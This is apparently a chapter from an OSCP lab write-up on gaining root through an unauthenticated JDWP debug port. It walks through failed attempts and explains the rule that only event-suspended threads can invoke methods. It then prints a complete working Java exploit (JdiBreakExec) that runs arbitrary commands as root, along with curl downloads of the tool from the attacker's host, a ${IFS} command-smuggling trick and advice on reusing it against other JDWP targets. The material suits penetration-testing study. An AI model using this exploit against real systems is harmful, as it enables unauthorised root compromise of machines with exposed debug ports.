# 06 — Privilege escalation: JDWP to root

`root@…:/# ` in one step, or twenty minutes of fighting the debugger protocol. This chapter is the
twenty minutes — including the four approaches that failed and exactly why, because the reason
JDWP invocation "just doesn't work" is the part that is not obvious from any writeup I could find
while doing it.

| Step | Runs on |
|---|---|
| 6.1 What JDWP is | — |
| 6.2 Attempt 1 — `jdb` | target |
| 6.3 Attempt 2 — hand-rolled JDWP client | Kali (dev) + target |
| 6.4 Attempt 3 — JDI, VM suspend | target |
| 6.5 The rule nobody documents | — |
| 6.6 Attempt 4 — breakpoints that never fire | target |
| 6.7 Attempt 5 — breakpoint + poke → root | Kali (build) + target |
| 6.8 The tool, in full | — |

---

## 6.1 What JDWP is, and why it is game over

The Java Debug Wire Protocol is how a debugger talks to a JVM. It is enabled at launch:

```
java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y ...
```

`server=y` means the JVM **listens** for a debugger. There is **no authentication of any kind** —
the protocol begins with the seven-byte ASCII handshake `JDWP-Handshake` and, once that is echoed,
the client may issue any command in the protocol, including:

- `VirtualMachine.CreateString` — allocate objects in the target heap
- `ClassType.InvokeMethod` / `ObjectReference.InvokeMethod` — **call any method, on any object**
- `VirtualMachine.Suspend/Resume`, `ThreadReference.*` — stop and inspect everything

`Runtime.getRuntime().exec(...)` is a method. There is no sandbox, no allow-list, no signature. A
JDWP port is unauthenticated remote code execution waiting for a TCP connection — here restricted
to loopback, which is exactly what a shell as `dev` provides.

The obstacle is not permission. It is that **invocation has strict preconditions**, and the error
you get when you get them wrong is a bare `INVALID_THREAD` (JDWP error 10) with no explanation.

## 6.2 Attempt 1 — `jdb`

The JDK ships a command-line debugger, and it is right there in `/usr/bin/jdb`:

**On the target**

```bash
jdb -attach 8000 <<'EOF'
threads
print new java.lang.ProcessBuilder("/bin/bash","-c","id > /tmp/jdwp_probe").start()
exit
EOF
```

```
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb ...
> "1" is not a valid thread id.
```

and the command never ran — the file it should have created does not exist:

**On the target**

```bash
cat /tmp/jdwp_probe
```

```
cat: /tmp/jdwp_probe: No such file or directory
```

`jdb`'s scripting mode is awkward: `threads` lists names like `main`, not `1`, and the `print`
command only evaluates inside a *current frame* — attaching to a running VM without stopping it does
not give you one. Re-tried with `thread main` and `eval`:

**On the target**

```bash
jdb -attach 8000 <<'EOF'
eval java.lang.Runtime.getRuntime().availableProcessors()
exit
EOF
```

`jdb` failed to resolve the static call from the top level. It is a fine debugger for humans stepping
through a suspended program, and the wrong tool for this job. Abandoned.

## 6.3 Attempt 2 — hand-rolled JDWP client

If the tool is awkward, speak the protocol directly. The packet format is simple:

```
length(4)  id(4)  flags(1)  [errorcode(2)]  commandset(1)  command(1)  data...
```

A first client was written against the command-set numbers from memory. That is where it broke:

**On Kali** (`~/t4s/jdwp_rce.py`, early version) — run **on the target** against loopback

```
[*] id sizes field/method/object/refType/frame = (5, 0, 1, 0, 2)
Traceback (most recent call last):
  ...
struct.error: unpack requires a buffer of 4 bytes
```

**Reading it:** those ID sizes are nonsense — a JVM cannot have a 0-byte method ID and a 2-byte
frame ID. The numbers are real protocol fields, just from the wrong reply: the client sent
`CommandSet(1).Command(4)` expecting `IDSizes`, and `Command(4)` is `AllThreads`, which returned an
empty list (0 threads) — hence a 4-byte parse of a 0-byte buffer.

The actual numbers:

| Function | CommandSet | Command |
|---|---|---|
| `VirtualMachine.IDSizes` | 1 | **7** (not 4) |
| `VirtualMachine.AllThreads` | 1 | 4 |
| `VirtualMachine.Suspend` | 1 | 8 |
| `VirtualMachine.Resume` | 1 | 9 |
| `VirtualMachine.CreateString` | 1 | 11 |
| `ThreadReference.Name` | **0x0B** | 1 |
| `ClassType.InvokeMethod` | 3 | **3** (not 1 — that is `Superclass`) |

After correcting the table, parsing worked and the client could attach, list threads, resolve
`java.lang.Runtime`, and create strings. The invoke call then failed anyway:

```
JDWP error 10 for cmdset 9 cmd 6
```

**`INVALID_THREAD`.** The thread existed, was suspended, and had frames — and the VM still refused
to invoke on it. This is the wall, and it is not a bug in the client.

## 6.4 Attempt 3 — JDI, VM suspend

The official answer to "I do not want to hand-parse JDWP" is **JDI**, the Java Debug Interface. It
ships in the JDK (`jdk.jdi` module) and it is what IDE debuggers use. Attach, suspend the VM, pick
the `main` thread, invoke:

**On the target**

```bash
curl -sS http://192.168.45.158:8888/JdiVmSuspend.java -o /tmp/JdiVmSuspend.java
javac --release 11 --add-modules jdk.jdi JdiVmSuspend.java
java --add-modules jdk.jdi JdiVmSuspend
```

```
[*] attached to OpenJDK 64-Bit Server VM 11.0.16
[*] thread=main suspended=true frames=12
Exception in thread "main" com.sun.jdi.IncompatibleThreadStateException
        at jdk.jdi/com.sun.tools.jdi.InvokableTypeImpl.invokeMethod(InvokableTypeImpl.java:116)
        at JdiVmSuspend.main(JdiVmSuspend.java:48)
```

**Reading it:** the thread reports `isSuspended() == true` and `frameCount() == 9`, and JDI still
refuses with `IncompatibleThreadStateException`. Because **`isSuspended()` is not the property the
VM checks.** Merely being stopped is not enough.

## 6.5 The rule: only event-suspended threads are invokable

The JDWP specification says a thread may be used for `InvokeMethod` only if it is **suspended by an
event** — a breakpoint, a step, an exception — and, unless you pass `INVOKE_SINGLE_THREADED`, all
*other* threads must be running. `VirtualMachine.Suspend` does not produce an event-suspended thread.
Neither does `ThreadReference.Suspend`.

That single sentence explains attempts 2 and 3: the thread was stopped, but not *at an event*.

So the plan becomes: get the thread to stop at a **breakpoint**, which is an event, then invoke while
the rest of the VM runs normally.

## 6.6 Attempt 4 — breakpoints that never fire

Two breakpoints were tried before the one that worked, and both taught something.

**`java.lang.StringBuilder.append`** — the obvious choice for "somewhere a string is handled":

**On the target**

```
[*] attached to OpenJDK 64-Bit Server VM 11.0.16
[*] breakpoint set at java.lang.StringBuilder.append
Exception in thread "main" java.lang.IllegalStateException: no breakpoint event received
```

It never fires because **since Java 9, string concatenation compiles to `invokedynamic` +
`StringConcatFactory`**, not to `StringBuilder.append`. The application does plenty of string work;
none of it calls that method.

**`java.net.ServerSocket.accept`** — the application does call this, in a loop:

**On the target**

```
[*] attached to OpenJDK 64-Bit Server VM 11.0.16
[*] breakpoint set at java.net.ServerSocket.accept
Exception in thread "main" java.lang.IllegalStateException: no breakpoint event received
```

A method-entry breakpoint fires when the thread *enters* the method. The `main` thread was already
parked **inside** `accept()` — waiting on a socket, entered long before we attached. It would only
break the *next* time round the loop, and it had no reason to go round: nobody was connecting to
port 5000.

That is the second half of the trick: **make the target execute the code path yourself.** The
statistics service answers on port 5000, so a single TCP connection from the debugger process makes
`accept()` return, `main` continue, and the loop execute real Java code — at which point a
breakpoint on any method called in that path (`String.getBytes` is called on the response) fires.

## 6.7 Attempt 5 — breakpoint on `String.getBytes`, plus a poke

The final tool does five things:

1. Attach with JDI, clear the startup suspend counts (`suspend=y` JVMs begin suspended; `vm.resume()`
   must be called until the count is zero or nothing runs).
2. Set a breakpoint on `java.lang.String.getBytes` with `SUSPEND_EVENT_THREAD` — **only the event
   thread stops, the VM keeps running.**
3. Start a thread that connects to `127.0.0.1:5000` after one second and writes a byte. This is the
   poke: it unblocks `accept()` and drives `main` into the code that serialises the response.
4. Wait for a `BreakpointEvent` **whose thread is named `main`** (other threads also call `getBytes`
   — the JDK's own I/O threads, for instance), then **disable the breakpoint** so the pending
   invocation does not trip over it again.
5. On that breakpoint-suspended thread, invoke `Runtime.getRuntime()` and then
   `Runtime.exec(command)`.

### Build it on Kali

**On Kali**

```bash
mkdir -p ~/jdwp && cd ~/jdwp
curl -sS -o JdiBreakExec.java \
  https://raw.githubusercontent.com/AV10V/OSCP/main/labs/192.168.237.150-text4shell/tools/JdiBreakExec.java
ls -l JdiBreakExec.java
```

Serve it to the target (the target has `curl`; it also has `wget` and `python3`):

**On Kali**

```bash
cd ~/jdwp && python3 -m http.server 8888 --bind 192.168.45.158
```

### Fetch and compile it on the target

**On the target**

```bash
cd /tmp
curl -sS http://192.168.45.158:8888/JdiBreakExec.java -o /tmp/JdiBreakExec.java
javac JdiBreakExec.java
```

```
Error: LinkageError occurred while loading main class JdiBreakExec
        java.lang.UnsupportedClassVersionError: JdiBreakExec has been compiled by a more recent
        version of the Java Runtime (class file version 62.0), this version of the Java Runtime
        only recognizes class file versions up to 55.0
```

**Reading it:** `javac` here is **18.0.2-ea** (chapter 05), which emits class file version **62**
for Java 14+. The runtime is **Java 11**, which understands up to **55**. Compile for the runtime,
not the compiler:

**On the target**

```bash
javac --release 11 --add-modules jdk.jdi JdiBreakExec.java
ls -l /tmp/JdiBreakExec.class
```

```
-rw-r--r-- 1 dev dev 5972 Nov 16 01:28 /tmp/JdiBreakExec.class
```

`--add-modules jdk.jdi` is needed because JDI is not in the default root set of modules.

### Run it

**On the target**

```bash
cd /tmp
java --add-modules jdk.jdi JdiBreakExec 127.0.0.1 8000 \
  'bash -c id>/tmp/r_id;cat${IFS}/root/proof.txt>/tmp/r_proof'
echo "RC=$?"
echo "== id =="; cat /tmp/r_id
echo "== proof =="; cat /tmp/r_proof
```

```
[*] attached to OpenJDK 64-Bit Server VM 11.0.16
[*] breakpoint set at java.lang.String.getBytes
[*] breakpoint hit on thread: main frames=9
[*] Runtime instance = instance of java.lang.Runtime(id=8)
[+] exec returned instance of java.lang.ProcessImpl(id=10)
RC=0
== id ==
uid=0(root) gid=0(root) groups=0(root)
== proof ==
43d31153587be5031d1db3f9a934eb46
```

**Reading it:**

- `breakpoint hit on thread: main frames=9` — the poke worked; `main` left `accept()`, ran the
  response-serialisation path, and hit `getBytes` nine frames deep.
- `Runtime instance … (id=8)` and `ProcessImpl id=10` — two successful method invocations on a
  breakpoint-suspended thread. Compare with `INVALID_THREAD` in 6.3.
- `uid=0(root)` — the child inherited the root JVM's credentials.
- `43d31153587be5031d1db3f9a934eb46` — `/root/proof.txt`, read by a process we started.

Note the `${IFS}` inside the command: `Runtime.exec(String)` splits the whole string on whitespace,
so `cat /root/proof.txt > /tmp/r_proof` would be torn apart into five argv entries. `${IFS}` is
expanded by `bash` after the split, so the string stays one token as far as `exec` is concerned.

## 6.8 The tool, in full

`tools/JdiBreakExec.java` — the exact file used above.

```java
import com.sun.jdi.Bootstrap;
import com.sun.jdi.ClassType;
import com.sun.jdi.Method;
import com.sun.jdi.ObjectReference;
import com.sun.jdi.ReferenceType;
import com.sun.jdi.StringReference;
import com.sun.jdi.ThreadReference;
import com.sun.jdi.Value;
import com.sun.jdi.VirtualMachine;
import com.sun.jdi.event.BreakpointEvent;
import com.sun.jdi.event.Event;
import com.sun.jdi.event.EventSet;
import com.sun.jdi.request.BreakpointRequest;
import com.sun.jdi.request.EventRequest;
import com.sun.jdi.connect.AttachingConnector;
import com.sun.jdi.connect.Connector;

import java.util.Collections;
import java.util.Map;

public class JdiBreakExec {
    public static void main(String[] args) throws Exception {
        String host = args[0];
        int port = Integer.parseInt(args[1]);
        String command = args[2];
        String breakClass = args.length > 3 ? args[3] : "java.lang.String";
        String breakMethod = args.length > 4 ? args[4] : "getBytes";
        String breakSig = args.length > 5 ? args[5] : "()[B";

        AttachingConnector conn = null;
        for (AttachingConnector c : Bootstrap.virtualMachineManager().attachingConnectors()) {
            if ("com.sun.jdi.SocketAttach".equals(c.name())) {
                conn = c;
            }
        }
        Map<String, Connector.Argument> cargs = conn.defaultArguments();
        cargs.get("hostname").setValue(host);
        cargs.get("port").setValue(String.valueOf(port));
        VirtualMachine vm = conn.attach(cargs);
        System.out.println("[*] attached to " + vm.name() + " " + vm.version());

        ReferenceType target = null;
        for (ReferenceType rt : vm.classesByName(breakClass)) {
            target = rt;
        }
        if (target == null) {
            throw new IllegalStateException("breakpoint class not loaded: " + breakClass);
        }
        Method bm = null;
        for (Method m : target.methodsByName(breakMethod, breakSig)) {
            bm = m;
        }
        if (bm == null) {
            throw new IllegalStateException("breakpoint method not found");
        }
        BreakpointRequest bp = vm.eventRequestManager().createBreakpointRequest(bm.location());
        bp.setSuspendPolicy(EventRequest.SUSPEND_EVENT_THREAD);
        bp.enable();
        System.out.println("[*] breakpoint set at " + breakClass + "." + breakMethod);

        // Clear the attach-time and startup suspend counts (suspend=y JVMs).
        for (int i = 0; i < 3; i++) {
            try {
                vm.resume();
            } catch (Exception ignored) {
            }
        }
        // Unblock the target's accept() so the post-accept code path runs.
        new Thread(new Runnable() {
            public void run() {
                try {
                    Thread.sleep(1000);
                    java.net.Socket s = new java.net.Socket("127.0.0.1", 5000);
                    s.getOutputStream().write('x');
                    s.getOutputStream().flush();
                    Thread.sleep(3000);
                    s.close();
                } catch (Exception ignored) {
                }
            }
        }).start();

        ThreadReference thread = null;
        EventSet hit = null;
        long deadline = System.currentTimeMillis() + 30000;
        while (thread == null && System.currentTimeMillis() < deadline) {
            EventSet es = vm.eventQueue().remove(2000);
            if (es == null) {
                continue;
            }
            for (Event ev : es) {
                if (ev instanceof BreakpointEvent) {
                    ThreadReference t = ((BreakpointEvent) ev).thread();
                    if ("main".equals(t.name())) {
                        thread = t;
                        hit = es;
                        break;
                    }
                }
            }
            if (thread == null) {
                es.resume();
            }
        }
        if (thread == null) {
            throw new IllegalStateException("no breakpoint event received");
        }
        System.out.println("[*] breakpoint hit on thread: " + thread.name()
                + " frames=" + thread.frameCount());
        bp.disable();  // avoid re-triggering during the pending invocation

        ReferenceType rt = vm.classesByName("java.lang.Runtime").get(0);
        Method getRuntime = null;
        Method exec = null;
        for (Method m : rt.methodsByName("getRuntime")) {
            if (m.signature().equals("()Ljava/lang/Runtime;")) {
                getRuntime = m;
            }
        }
        for (Method m : rt.methodsByName("exec")) {
            if (m.signature().equals("(Ljava/lang/String;)Ljava/lang/Process;")) {
                exec = m;
            }
        }

        ObjectReference rtObj = (ObjectReference) ((ClassType) rt).invokeMethod(
                thread, getRuntime, Collections.<Value>emptyList(), 0);
        System.out.println("[*] Runtime instance = " + rtObj);

        StringReference cmdRef = vm.mirrorOf(command);
        ObjectReference proc = (ObjectReference) rtObj.invokeMethod(
                thread, exec, Collections.<Value>singletonList(cmdRef), 0);
        System.out.println("[+] exec returned " + proc);

        hit.resume();
        Thread.sleep(500);
        try {
            vm.resume();
        } catch (Exception ignored) {
        }
        vm.dispose();
    }
}
```

### Reusing it on another JDWP target

The three optional arguments let you point the breakpoint elsewhere when port 5000 does not exist:

```bash
java --add-modules jdk.jdi JdiBreakExec 127.0.0.1 8000 'id' \
  java.lang.String getBytes '()[B'      # default: any thread doing string I/O
```

or, for a service that is genuinely busy, break on something you can provoke:

```bash
java --add-modules jdk.jdi JdiBreakExec 127.0.0.1 8000 'id' \
  java.lang.ClassLoader loadClass '(Ljava/lang/String;)Ljava/lang/Class;'
```

If the breakpoint never fires, the answer is almost always "the target is idle" — send it a request
on whatever port it serves, and it will walk into your breakpoint.
